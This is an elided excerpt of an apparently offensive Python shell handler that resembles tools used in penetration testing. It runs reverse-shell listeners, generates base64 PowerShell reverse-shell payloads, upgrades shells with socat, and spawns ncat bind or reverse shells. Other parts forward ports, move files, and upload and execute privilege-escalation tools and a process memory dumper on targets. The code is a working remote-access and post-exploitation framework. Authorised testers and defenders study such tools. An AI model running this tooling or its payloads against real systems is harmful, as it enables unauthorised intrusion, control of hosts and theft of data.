...
chunks = lambda string, length: (
    string[0 + i : length + i] for i in range(0, len(string), length)
)
pathlink = (
    lambda path: f"\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07"
)
normalize_path = lambda path: os.path.normpath(
...
def Open(item, terminal=False):
    ...
    r, _, _ = select([process.stderr], [], [], 0.01)
...
class Interfaces:
        ...
        for line in subprocess.check_output(params).decode().splitlines():
            ...
            if current_interface:
                ...
                if ip:
                    ...
                    current_interface = (
                        None  # TODO support multiple IPs in one interface
                    )
        return interfaces
    ...
    def list(self):
        if shutil.which("ip"):
            ...
            logger.error(
                "'ip', 'ifconfig' and 'busybox' commands are not available. (Really???)"
            )
            return dict()
    ...
    def fill(self):
        for row in self.data:
            for index, element in enumerate(row):
                ...
                row[index] = element + fillchar * (
                    self.col_max_lens[index] - len(element)
                )
...
class PBar:
    ...
    def __init__(self, end, caption="", barlen=None, queue=None, metric=None):
        ...
        if self.metric:
            Thread(target=self.watch_speed, daemon=True).start()
        else:
            self.metric = lambda x: f"{x:,}"
    ...
    def watch_speed(self):
        ...
        while self:
            ...
            if self.speed_avg:
                self.eta = int(self.end / self.speed_avg) - self.elapsed
            if self:
                self.render()
    ...
    def update(self, step=1):
        ...
        if self.pos >= self.end:
            self.terminate()
        if self.percent > self.percent_prev:
            self.render()
    ...
    def render_one(self):
        ...
        elapsed = (
            ...
            else f" | Elapsed {timedelta(seconds=self.elapsed)}"
        )
        speed = "" if not hasattr(self, "speed") else f" | {self.metric(self.speed)}/s"
        eta = (
            "" if not hasattr(self, "eta") else f" | ETA {timedelta(seconds=self.eta)}"
        )
        right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
        bar_space = self.barlen or os.get_terminal_size().columns - len(left) - len(
            right
        )
    ...
    def render(self):
        if hasattr(__class__, "render_lock"):
            __class__.render_lock.acquire()
        for pbar in __class__.pbars:
            pbar.render_one()
        print(f"\x1b[{len(__class__.pbars)}A", end="", flush=True)
        if hasattr(__class__, "render_lock"):
            __class__.render_lock.release()
...
class paint:
    ...
    def __str__(self):
        if self.colors:
            content = (
                self.text + __class__._escape(__class__._codes["RESET"])
    ...
    def __getattr__(self, attr):
        ...
        for color in attr.split("_"):
            if color in __class__._codes:
                ...
                self.colors.append(
                    prefix + "8;5;" + str(__class__._colors[color.lower()])
                )
        return self
...
class CustomFormatter(logging.Formatter):
    ...
    def format(self, record):
        ...
        if core.wait_input:
            suffix += (
                bytes(core.output_line_buffer).decode() + readline.get_line_buffer()
            )
...
def my_input(
    ...
    histfile=None,
    histlen=None,
    completer=lambda text, state: None,
...
class BetterCMD:
    ...
    def do_DEBUG(self, line):
        ...
        interact(
            banner=paint("===> Entering debugging console...").CYAN,
            local=globals(),
...
class MainMenu(BetterCMD):
            ...
            def newfunc(self, ID):
                if current:
                    if not self.sid:
                        if core.sessions:
                            cmdlogger.warning(
                                'No session ID selected. Select one with "use [ID]"'
                            )
                        else:
                            cmdlogger.warning(
                                "No available sessions to perform this action"
                            )
                        return False
                else:
                    if ID:
    ...
    def do_help(self, command):
        ...
        if command:
            ...
            for section in self.commands:
                ...
                for command in self.commands[section]:
                    parts = dedent(
                        getattr(self, f"do_{command.split('|')[0]}").__doc__
                    ).split("\n")[1:3]
        ...
        if line:
            ...
            if core.sessions:
                for host, sessions in core.hosts.items():
                    ...
                    table.header = [
                        paint(header).cyan
                        for header in ("ID", "Shell", "User", "Source")
                    ]
                    for session in sessions:
                        if self.sid == session.id:
                            ...
                            if (
                                session.host_needs_control_session
                                and session.control_session is session
                            ):
                        ...
                        source = (
                            session.listener
                            or f"Connect({session._host}:{session.port})"
                        )
                        table += [
                            ID,
                            paint(session.type).CYAN
                            if session.type == "PTY"
                            else session.type,
                            session.user or "N/A",
                            source,
    ...
    def do_kill(self, ID):
        ...
        if ID == "*":
            if not core.sessions:
                ...
                if (
                    ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower()
                    == "y"
                ):
    ...
    def do_portfwd(self, line):
        ...
        core.sessions[self.sid].portfwd(
            _type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport)
        )
    ...
    def do_upload(self, local_items):
        ...
        """
        if local_items:
            core.sessions[self.sid].upload(
                local_items, randomize_fname=options.upload_random_suffix
            )
        else:
            cmdlogger.warning("No files or directories specified")
    ...
    def do_maintain(self, line):
        ...
        if line:
            ...
            status = (
                paint("Enabled").white_GREEN
                if options.maintain >= 2
                else paint("Disabled").white_RED
            )
            cmdlogger.info(
                f"Maintain value set to {paint(options.maintain).yellow} {status}"
            )
    ...
    def do_exec(self, cmdline):
        ...
        if cmdline:
            if core.sessions[self.sid].agent:
                ...
                output = core.sessions[self.sid].exec(cmdline, timeout=None, value=True)
                print(output)
        else:
    ...
    def do_listeners(self, line):
        ...
        if line:
            ...
            parser_add.add_argument(
                "-i", "--interface", help="Interface to bind", default="any"
            )
            parser_add.add_argument(
                "-p",
                "--ports",
                help="Ports to listen on (comma separated)",
                default=[options.default_listener_port],
            )
            parser_add.add_argument("-t", "--type", help="Listener type", default="tcp")
            parser_add.add_argument(
                "-j", "--jump", action="append", help="Jump endpoint"
            )
            ...
            if core.listeners:
                table = Table(joinchar=" | ")
                table.header = [
                    paint(header).red for header in ("ID", "Type", "Host", "Port")
                ]
    ...
    def do_SET(self, line):
        ...
        if not line:
            rows = [
                [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
            ...
            try:
                ...
                if len(args) == 1:
                    ...
                    if getattr(options, param) != old_value:
                        cmdlogger.info(
                            f"'{param}' option set to: {paint(getattr(options, param)).yellow}"
                        )
    ...
    def default(self, line):
        if line in ["q", "quit"]:
            ...
            parts = line.split(" ", 1)
            candidates = [
                command for command in self.raw_commands if command.startswith(parts[0])
            ]
            if not candidates:
                cmdlogger.warning(
                    f"No such command: '{line}'. Issue 'help' for all available commands"
                )
    ...
    def complete_listeners(self, text, line, begidx, endidx):
        ...
        if arg == "listeners":
            ...
            return [
                iface_ip
                for iface_ip in Interfaces().list_all + ["any", "0.0.0.0"]
                if iface_ip.startswith(text)
            ]
        elif arg in ("-t", "--type"):
    ...
    def complete_run(self, text, line, begidx, endidx):
        return [
            module.__name__
            for module in modules().values()
            if module.__name__.startswith(text)
        ]
...
class ControlQueue:
    ...
    def clear(self):
        ...
        os.read(
            self._out, amount
        )  # maybe needs 'try' because sometimes close() precedes
                        ...
                        for _type, _value in readable.messenger.feed(data):
                            ...
                            if _type == Messenger.SHELL:
                                ...
                                try:
                                    ...
                                    logger.debug(
                                        f"Cannot write to stream; Stream <{stream_id}> died prematurely"
                                    )
                    else:
                        target.write(data)
...
def Connect(host, port):
    try:
        ...
        if not core.started:
            core.start()
        logger.info(
            f"Connected to {paint(host).blue}:{paint(port).red} {EMOJIS['target']}"
        )
...
class TCPListener:
    ...
    def start(self):
        ...
        if self.host == "0.0.0.0":
            specific = paint("→  ").cyan + str(paint(" • ").cyan).join(
                [str(paint(ip).cyan) for ip in Interfaces().list.values()]
            )

        logger.info(
            f"Listening for reverse shells on {paint(self.host).blue}{paint(':').red}{paint(self.port).red} {specific}"
        )
    ...
    def payloads(self, interface_filter=None):
        ...
        for ip in ips:
            ...
            interface_count += 1
            output.extend(
                (f"➤  {iface_name} → {str(paint(ip).cyan)}:{str(paint(port).red)}", "")
            )
            ...
            output.append(
                "cmd /c powershell -e "
                + base64.b64encode(
                    presets[2].format(ip, port).encode("utf-16le")
                ).decode()
            )
...
class Session:
    def __init__(self, _socket, target, port, listener=None):
        with core.conn_semaphore:
            ...
            try:
                ...
                logger.error(
                    f"Invalid connection from {self.target} {EMOJIS['invalid_shell']}"
                )
                return
            ...
            if self.determine():
                ...
                if not options.no_log:
                    ...
                    self.logpath = (
                        self.directory
                        / f"{datetime.now().strftime('%Y_%m_%d-%H_%M_%S-%f')[:-3]}.log"
                    )
                ...
                attach_conditions = [
                    ...
                    self.listener
                    and not menu.active.is_set()
                    and (
                        len(core.hosts[self.name]) == options.maintain
                        or not maintain_success
                    ),
    ...
    def can_deploy_agent(self):
        if self._can_deploy_agent is None:
            if Path(self.directory / ".noagent").exists():
                ...
                if _bin:
                    version = self.exec(
                        f"{_bin} -V 2>&1 || {_bin} --version 2>&1", value=True
                    )
                    try:
                        major, minor, micro = re.search(
                            r"Python (\d+)\.(\d+)(?:\.(\d+))?", version
                        ).groups()
                    except:
                        self._can_deploy_agent = False
                        return self._can_deploy_agent
                    self.remote_python_version = (int(major), int(minor), int(micro))
                    if self.remote_python_version >= (
                        2,
                        3,
                    ):  # Python 2.2 lacks: tarfile, os.walk, yield
    ...
    def spare_control_sessions(self):
        return [
            session for session in self.host_control_sessions if session is not self
        ]

    @property
    def host_needs_control_session(self):
        return [
            session for session in core.hosts[self.name] if session.need_control_session
        ]

    @property
    def need_control_session(self):
        return all(
            [self.OS == "Unix", self.type == "PTY", not self.agent, not self.new]
        )
    ...
    def get_system_info(self):
        ...
        if self.OS == "Unix":
            ...
            response = self.exec(
                r'printf "$({0} -n)\t'
                r"$({0} -s)\t"
                r'$({0} -m 2>/dev/null|grep -v unknown||{0} -p 2>/dev/null)"'.format(
                    self.bin["uname"]
                ),
                agent_typing=True,
                value=True,
            ...
            if (not "\n" in self.systeminfo) and (
                "OS Name" in self.systeminfo
            ):  # TODO TEMP PATCH
    ...
    def get_shell_pid(self):
        ...
        if not (isinstance(response, str) and response.isnumeric()):
            logger.error(
                f"Cannot get the PID of the shell. Response:\r\n{paint(response).white}"
            )
            return False
        return response
    ...
    def get_user(self):
        if self.OS == "Unix":
            response = self.exec(
                'echo "$(id -un)($(id -u))"', agent_typing=True, value=True
            )
    ...
    def get_tty(self, silent=False):
        ...
        if not (isinstance(response, str) and response.startswith("/")):
            if not silent:
                logger.error(
                    f"Cannot get the TTY of the shell. Response:\r\n{paint(response).white}"
                )
            return False
        return response
        ...
        if not self._bin:
            try:
                if self.OS == "Unix":
                    ...
                    response = self.exec(
                        f"for i in {' '.join(binaries)}; do which $i 2>/dev/null || echo;done"
                    )
                    if response:
                    ...
                    if missing:
                        logger.debug(
                            paint(
                                f"We didn't find the binaries: {missing}. Trying another method"
                            ).red
                        )
                        response = self.exec(
                        ...
                        if response:
                            self._bin.update(
                                dict(zip(missing, response.decode().splitlines()))
                            )
        ...
        if self._tmp is None:
            if self.OS == "Unix":
                ...
                if not self._tmp:
                    ...
                    logger.debug(
                        f"Available writable directory on target: {paint(self._tmp).RED}"
                    )
        ...
        def newfunc(self, *args, **kwargs):
            if not self.agent:
                if not self.upgrade_attempted and self.can_deploy_agent:
                    logger.warning(
                        "This can only run in python agent mode. I am trying to deploy the agent"
                    )
                    self.upgrade()
                    if not self.agent:
    ...
    def log(self, data, _input=False):
        ...
        try:
            if _input:
                self.logfile.write(
                    bytes(paint("ISSUED ==>").GREEN + " ", encoding="utf8")
                )
    ...
    def determine(self, path=False):
        ...
        def expect(data):
            ...
            if var_value1 + var_value2 in data:
                ...
                f"'{var_name1}' is not recognized as an internal or external command"
                in data
            ):
                ...
                f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet"
                in data
            ):
        ...
        if response:
            ...
            if var_value1 + var_value2 in response:
                ...
                f"'{var_name1}' is not recognized as an internal or external command"
                in response
                or re.search("Microsoft Windows.*>", response, re.DOTALL)
            ):
                self.OS = "Windows"
                self.type = "Raw"
                self.subtype = "cmd"
                ...
                win_version = re.search(
                    r"Microsoft Windows \[.* (.*)\]", response, re.DOTALL
                )
                if win_version:
                ...
                f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet"
                in response
                or re.search("PS.*>", response, re.DOTALL)
            ):
                self.OS = "Windows"
                self.type = "Raw"
                self.subtype = "psh"
    ...
    def exec(
        ...
        if (
            self.agent and not agent_typing
        ):  # TODO environment will not be the same as shell
            if cmd:
                cmd = dedent(cmd)
                if value:
                    buffer = io.BytesIO()
                ...
                return (
                    buffer.getvalue().rstrip().decode(errors="replace")
                    if value
                    else True
                )
            return None
        ...
        with self.lock:
                ...
                if raw:
                    ...
                    if self.OS == "Unix":
                        ...
                        if self.subtype == "cmd" and len(cmd) > MAX_CMD_PROMPT_LEN:
                            logger.error(
                                f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters"
                            )
                            return False

                    self.subchannel.pattern = re.compile(
                        rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
                        rf"{'.' if self.interactive else ''}".encode(),
                        re.DOTALL,
                    )
            ...
            try:
                while self.subchannel.result is None:
                    ...
                    readables, _, _ = select(
                        [self.subchannel.control, self.subchannel], [], [], timeout
                    )
                    ...
                    if need_check:
                        ...
                        if raw and self.echoing and cmd:
                            ...
                            if re.search(
                                echoed_cmd_regex + (b"." if self.interactive else b""),
                                result,
                                re.DOTALL,
                            ):
                                self.subchannel.result = re.sub(
                                    echoed_cmd_regex, b"", result
                                )
                                break
                            else:
                        ...
                        if not raw:
                            ...
                            logger.debug(
                                paint(
                                    "We didn't get all data; continue receiving"
                                ).yellow
                            )
                            ...
                            if expect_func(buffer.getvalue()):
                                ...
                                logger.debug(
                                    paint(
                                        "No expected strings found in data. Receive again..."
                                    ).yellow
                                )
            ...
            if value and self.subchannel.result is not False:
                if self.OS == "Windows" and self.type == "PTY":  # quirk
                    self.subchannel.result = re.sub(
                        rb"\x1b\[(?:K|\?25h|25l|82X)", b"", self.subchannel.result
                    )
                self.subchannel.result = self.subchannel.result.strip().decode(
                    errors="replace"
                )  # TODO check strip
            logger.debug(
                f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}"
            )
            self.subchannel.active = False

            if separate and self.subchannel.result:
                self.subchannel.result = re.search(
                    rb"..\x01.*", self.subchannel.result, re.DOTALL
                )[0]
                buffer = io.BytesIO()
    ...
    def upgrade(self):
        ...
        if self.OS == "Unix":
            ...
            if self.can_deploy_agent:
                ...
                socat_cmd = (
                    f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
                )
                if self.bin["script"]:
                    ...
                    _bin = "/var/tmp/socat"
                    if not self.exec(
                        f"test -f {_bin} || echo x"
                    ):  # TODO maybe needs rstrip
                        cmd = socat_cmd.format(_bin)
                    else:
                        logger.warning(
            ...
            if not self.can_deploy_agent and not self.spare_control_sessions:
                ...
                self.spawn()
                try:
                    new_session = core.sessions[
                        core.session_wait.get(timeout=options.short_timeout)
                    ]
            ...
            if self.can_deploy_agent and not isinstance(response, bytes):
                logger.error(
                    "The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent"
                )
            ...
            logger.info(
                f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! {EMOJIS['upgrade']}"
            )
    ...
    def update_pty_size(self):
        ...
        if self.OS == "Unix":
            if self.agent:
                self.send(
                    Messenger.message(
                        Messenger.RESIZE, struct.pack("HH", lines, columns)
                    )
                )
            else:  # TODO
                threading.Thread(
    ...
    def readline_loop(self):
        while core.attached_session == self:
            try:
                cmd = input(
                    "\033[s\033[u", self.histfile, options.histlength, None, "\t"
                )  # TODO
                if self.subtype == "cmd":
                ...
                logger.error(
                    f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}"
                )
            else:
    ...
    def attach(self):
        if threading.current_thread().name != "Core":
            if self.new:
                upgrade_conditions = [
                    ...
                    not (
                        self.need_control_session
                        and self.host_control_sessions == [self]
                    ),
        ...
        if not options.no_log:
            logger.info(
                f"Logging to {paint(self.logpath).yellow_DIM} {EMOJIS['logfile']}"
            )
    ...
    def get_subtype(self):
        response = self.exec(
            "$PSVersionTable", expect_func=lambda x: b":\\" in x, raw=True
        )
        if response:
    ...
    def download(self, remote_items):
        ...
        if self.OS == "Unix":
            ...
            if self.agent:
                ...
                while True:
                    ...
                    if data:
                        ...
                        while "\n" in error_buffer:
                            ...
                            logger.error(
                                str(paint("<REMOTE>").cyan) + " " + str(paint(line).red)
                            )
                    else:
                        break
                ...
                remote_items = " ".join(
                    [os.path.join(self.cwd, part) for part in shlex.split(remote_items)]
                )
                ...
                send_size = int(
                    self.exec(
                        rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"
                    )
                )
                ...
                for offset in range(0, send_size, options.download_chunk_size):
                    response = self.exec(
                        f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}"
                    )
                    if response is False:
            ...
            for path in remote_paths:
                ...
                if os.path.isabs(path) and os.path.exists(local_path):
                    ...
                    logger.error(
                        f"{paint('Download Failed').RED_white} {shlex.quote(path)}"
                    )
            ...
            try:
                with zipfile.ZipFile(
                    io.BytesIO(base64.b64decode(data)), "r"
                ) as zipdata:
                    for item in zipdata.infolist():
                        item.filename = item.filename.replace("\\", "/")
                        downloaded.add(
                            Path(local_download_folder)
                            / Path(item.filename.split("/")[0])
                        )
                        newpath = Path(
                            zipdata.extract(item, path=local_download_folder)
                        )
        ...
        for item in downloaded:
            logger.info(
                f"{paint('Download OK').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}"
            )
    ...
    def upload(
        ...
        try:
            local_items = [
                ...
                else normalize_path(item)
                for item in shlex.split(local_items)
            ]
        ...
        if self.OS == "Unix" and not self.agent:
            ...
            for binary in dependencies:
                if not self.bin[binary]:
                    logger.error(
                        f"'{binary}' binary is not available at the target. Cannot upload..."
                    )
                    return []
        ...
        if self.OS == "Unix":
            ...
            if self.agent:
                ...
                remote_available_blocks, remote_block_size = map(
                    int, response.split(";")
                )
                ...
                remote_block_size = int(
                    self.exec(
                        rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}',
                        value=True,
                    )
                )
                remote_space = (
                    int(
                        self.exec(
                            f"df -k {destination}|tail -1|awk '{{print $4}}'",
                            value=True,
                        )
                    )
                    * 1024
            ...
            for item in resolved_items:
                if isinstance(item, tuple):
                    local_size += (
                        ceil(len(item[1]) / remote_block_size) * remote_block_size
                    )
                else:
            ...
            def handle_exceptions(func):
                def inner(*args, **kwargs):
                    try:
                        ...
                        logger.error(
                            str(paint("<LOCAL>").yellow) + " " + str(paint(e).red)
                        )
            ...
            for item in resolved_items:
                if isinstance(item, tuple):
                    ...
                    altname = (
                        f"{item.stem}-{rand(8)}{item.suffix}"
                        if randomize_fname
                        else item.name
                    )
        ...
        for item in altnames:
            ...
            logger.info(
                f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}"
            )
            ...
            if any([self.listener, port, host]):
                ...
                if self.bin["bash"]:
                    ...
                    if not self.exec(f"test -f {ncat_binary} || echo x"):
                        ...
                        ncat_binary = self.need_binary("ncat", URLS["ncat"])
                        if ncat_binary:
                            cmd = ncat_cmd.format(ncat_binary)
                        else:
                ...
                if not Connect(host, port):
                    logger.info(
                        "Spawn bind shell failed. I will try getting a reverse shell..."
                    )
    ...
    def portfwd(self, _type, lhost, lport, rhost, rport):
        ...
        def server_thread():
            with ThreadedTCPServer(
                None, ThreadedTCPRequestHandler, bind_and_activate=False
            ) as server:
                ...
                task.append(server)
                logger.info(
                    f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type == 'L' else '<-'} {rhost}:{rport}"
                )
    ...
    def kill(self):
        ...
        if thread_name != "Core":
            if self.OS:
                if (
                    self.host_needs_control_session
                    and not self.spare_control_sessions
                    and self.control_session is self
                ):
                    sessions = ", ".join(
                        [str(session.id) for session in self.host_needs_control_session]
                    )
                    logger.warning(
        ...
        for portfwd in self.tasks["portfwd"]:
            ...
            logger.warning(
                f"Stopping Port Forwarding: {info[1]}:{info[2]} {'->' if info[0] == 'L' else '<-'} {info[3]}:{info[4]}"
            )
            server.shutdown()
            server.server_close()
...
class Messenger:
    ...
    def message(_type, _data):
        return (
            struct.pack(Messenger.HEADER_CODE, len(_data) + Messenger.TYPE_BYTES, _type)
            + _data
        )
    ...
    def feed(self, data):
        ...
        while True:
            if not self.len:
                ...
                self.len = struct.unpack(
                    Messenger._LEN_CODE, self.length_buffer.getvalue()
                )[0]
                ...
                _type = struct.unpack(
                    Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES)
                )[0]
...
class Stream:
    def __init__(self, _id, _session=None):
        ...
        if self.session is None:
            ...
            self.writefunc = lambda data: self.session.send(
                Messenger.message(Messenger.STREAM, self.id + data)
            )
    ...
    def __lshift__(self, data):
        ...
        if not self.feed_thread:
            self.feed_thread = threading.Thread(
                target=self.feed, name="feed stream -> " + repr(self.id)
            )
                    ...
                    for _type, _value in messages:
                        if _type == Messenger.SHELL:
                            ...
                            if __type == "S".encode():
                                ...
                                threading.Thread(
                                    target=run,
                                    args=(stdin_stream, stdout_stream, stderr_stream),
                                ).start()
...
class peass_ng(Module):
    ...
    def run(session, args):
        ...
        if session.OS == "Unix":
            ...
            while True:
                answer = ask(
                    f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}"
                ).lower()
                if answer in ("y", ""):
    ...
    def run(session, args):
        ...
        if session.OS == "Unix":
            if not session.system == "Linux":
                logger.error(
                    f"This modules runs only on Linux, not on {session.system}."
                )
                return False
            path = session.upload(URLS["uac_linux"], remote_path=session.tmp)[0]
            result = session.exec(
                f"tar xf {path} -C {session.tmp} >/dev/null", value=True
            )
            if not result:
                logger.info(f"UAC successfully extracted on {session.tmp}")
            else:
                logger.error(
                    f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}"
                )
                return False
            ...
            logger.info(
                f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system."
            )
            ...
            with open(tf, "w") as f:
                ...
                f.write(cmd)
            logger.info(
                f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%"
            )
            session.script(tf)
...
class linux_procmemdump(Module):
    ...
    def run(session, args):
        ...
        if session.OS == "Unix":
            ...
            PID = input("PID: ")
            session.exec(
                f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}"
            )
            logger.info(
                f"Strings of the process dump will be stored at {session.tmp}/{PID}/"
            )
        else:
            logger.error("This module runs only on Unix shells")
        ...
        if session.OS == "Unix":
            ...
            with zipfile.ZipFile(io.BytesIO(archive)) as z:
                try:
                    session.upload(
                        url,
                        url_to_bytes_fn=lambda x: ("agent.exe", z.read("agent.exe")),
                    )
                except KeyError:
                    logger.error("File 'agent' not found in downloaded archive")
                    return
        ...
        if session.OS == "Unix":
            ...
            with zipfile.ZipFile(io.BytesIO(archive)) as z:
                try:
                    session.upload(
                        url,
                        url_to_bytes_fn=lambda x: ("chisel.exe", z.read("chisel.exe")),
                    )
                except KeyError:
    ...
    def run(session, args):
        ...
        if session.OS == "Unix":
            ...
            with tarfile.open(fileobj=io.BytesIO(archive), mode="r:gz") as tf:
                ...
                session.upload(
                    URLS["ngrok_linux"],
                    url_to_bytes_fn=lambda x: ("ngrok", f.read()),
                    remote_path=session.tmp,
                )
    ...
    def run(session, args):
        ...
        if session.OS == "Unix":
            ...
            result = subprocess.run(
                payload_creation_cmd, shell=True, text=True, capture_output=True
            )
...
class gtfonow(Module):
    category = "Privilege Escalation"

    def run(session, args):
        """
        Upload the latest version of gtfonow to the target
        """
        if session.OS == "Unix":
            session.upload(URLS["gtfonow"])
            tf = f"/tmp/{rand(8)}"
            cmd = "chmod +x ./gtfonow.py && ./gtfonow.py"
            with open(tf, "w") as f:
                f.write("#!/bin/bash\n")
                f.write(cmd)
            session.script(tf)
...
class FileServer:
    ...
    def links(self):
        ...
        for ip in ips:
            ...
            for urlpath, filepath in self.filemap.items():
                table += (
                    paint(
                        f"{EMOJIS['folder'] if os.path.isdir(filepath) else EMOJIS['file']} "
                    ).green
                    + paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE,
                    filepath,
                )
    ...
    def _start(self):
        filemap, host, port, url_prefix, quiet = (
            self.filemap,
            self.host,
            self.port,
            self.url_prefix,
        ...
        class CustomHandler(SimpleHTTPRequestHandler):
            ...
            def log_message(self, format, *args):
                ...
                response = getattr(
                    paint(f'{response[0]} {response[1]} {response[3]}"'), color
                )
        ...
        with CustomTCPServer(
            (self.host, self.port), CustomHandler, bind_and_activate=False
        ) as self.httpd:
    ...
    with ThreadPoolExecutor(threads) as ex:
        ...
        for fut in as_completed(futures):
            ...
            if __name__ == "__main__":
                color = (
                    "RED"
                    if isinstance(status_code, int) and status_code >= 400 or err
                    else "GREEN"
                )
                print(
                    f"{paint(url).cyan}{paint('.').DIM * (space_num - len(url))} => {getattr(paint(status_code), color)}"
                )
    return all_ok
    ...
    def __setattr__(self, option, value):
        ...
        if hasattr(self, option) and getattr(self, option) is not None:
            ...
            if new_value_type == orig_value_type:
                ...
                show(
                    f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>"
                )
        else:
            self.__dict__[option] = value
...
def main():
    ...
    parser = ArgumentParser(
        ...
        formatter_class=lambda prog: RawTextHelpFormatter(
            prog, width=150, max_help_position=40
        ),
    )
    ...
    parser.add_argument(
        "-p",
        "--ports",
        help=f"Ports (comma separated) to listen/connect/serve, depending on -i/-c/-s options\n\
(Default: {options.default_listener_port}/{options.default_bindshell_port}/{options.default_fileserver_port})",
    )
    parser.add_argument(
        "args", nargs="*", help="Arguments for -s/--serve and SSH reverse shell modes"
    )
    ...
    method.add_argument(
        "-i",
        "--interface",
        help="Local interface/IP to listen. (Default: 0.0.0.0)",
        metavar="",
    )
    method.add_argument("-c", "--connect", help="Bind shell Host", metavar="")
    method.add_argument(
        "-j", "--jump", help="Reverse shell jump endpoints", action="append", metavar=""
    )
    ...
    hints.add_argument(
        "-a",
        "--payloads",
        help="Show sample reverse shell payloads for active Listeners",
        action="store_true",
    )
    hints.add_argument(
        "-l",
    ...
    log.add_argument(
        "-L", "--no-log", help="Disable session log files", action="store_true"
    )
    log.add_argument(
        "-T", "--no-timestamps", help="Disable timestamps in logs", action="store_true"
    )
    log.add_argument(
        "-CT",
        "--no-colored-timestamps",
        help="Disable colored timestamps in logs",
        action="store_true",
    )

    misc = parser.add_argument_group("Misc")
    misc.add_argument(
        "-m", "--maintain", help="Keep N sessions per target", type=int, metavar=""
    )
    misc.add_argument(
        "-M", "--menu", help="Start in the Main Menu.", action="store_true"
    )
    misc.add_argument(
        "-S",
        "--single-session",
        help="Accommodate only the first created session",
        action="store_true",
    )
    misc.add_argument(
        "-C",
        "--no-attach",
        help="Do not auto-attach on new sessions",
        action="store_true",
    )
    misc.add_argument(
        "-U", "--no-upgrade", help="Disable shell auto-upgrade", action="store_true"
    )
    misc.add_argument(
        "-O", "--oscp-safe", help="Enable OSCP-safe mode", action="store_true"
    )

    misc = parser.add_argument_group("File server")
    misc.add_argument(
        "-s", "--serve", help="Run HTTP file server mode", action="store_true"
    )
    misc.add_argument(
        "-prefix", "--url-prefix", help="URL path prefix", type=str, metavar=""
    )
    ...
    debug.add_argument(
        "-N",
        "--no-bins",
        help="Simulate missing binaries on target (comma-separated)",
        metavar="",
    )
    debug.add_argument(
    ...
    debug.add_argument(
        "-dd", "--dev-mode", help="Enable developer mode", action="store_true"
    )
    debug.add_argument(
        "-cu",
        "--check-urls",
        help="Check hardcoded URLs health and exit",
        action="store_true",
    )
    ...
    # Reverse shell via SSH
        ...
        if len(options.args) > 1:
            for port in options.ports:
                ...
                options.args.append(
                    f"HOST=$(echo $SSH_CLIENT | cut -d' ' -f1); PORT={port or options.default_listener_port};"
...
file_handler.setFormatter(
    CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S")
)
...
debug_file_handler.addFilter(
    lambda record: True if record.levelno == logging.DEBUG else False
)
...
URLS = {
    ...
    "gtfonow": "https://github.com/MIISTERC/GTFONow/releases/download/v0.3.1/gtfonow.py",
}
EMOJIS = {
    "folder": "📁",
    "file": "📄",
